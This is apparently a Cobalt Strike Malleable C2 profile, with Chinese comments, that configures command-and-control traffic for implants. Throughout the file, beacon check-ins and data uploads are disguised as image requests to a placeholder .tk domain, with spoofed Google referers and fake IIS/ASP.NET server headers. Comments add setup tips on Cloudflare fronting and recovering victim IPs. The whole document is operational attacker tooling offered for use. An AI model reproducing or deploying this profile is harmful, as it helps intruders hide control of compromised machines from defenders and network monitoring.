https-certificate {
    set keystore "tk.store";    #证书名字
    set password "123456";        #证书密码
}
#以上没有配置cloudflare的时候可以先不写

http-config {
    set trust_x_forwarded_for "true"; #获取真实上线IP
}
http-get {
    set uri "/image/";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
        header "Referer" "http://www.google.com";
        header "Host" "xxx.tk";  #域名,还没有配置cloudflare的时候这一行注释掉
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";
        metadata {
            netbios;
            append ".jpg";  # 传输内容自动追加的后缀
            uri-append;
        }
    }
    server {
        header "Content-Type" "img/jpg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";
        output {
            base64;  # 加密方式（base64、base64url、netbios、netbiosu）
            print;
        }
    }
}
http-post {
    set uri "/email/";
    client {
        header "Content-Type" "application/octet-stream";
        header "Referer" "http://www.google.com"; 
        header "Host" "xxx.tk";  #域名,还没有配置cloudflare的时候这一行注释掉
        header "Pragma" "no-cache";
        header "Cache-Control" "no-cache";
        id {
            netbiosu;
            append ".png";
            uri-append;
        }
        output {
            base64;
            print;
        }
    }
    server {
        header "Content-Type" "img/jpg";
        header "Server" "Microsoft-IIS/6.0";
        header "X-Powered-By" "ASP.NET";
        output {
            base64;
            print;
        }
    }
}
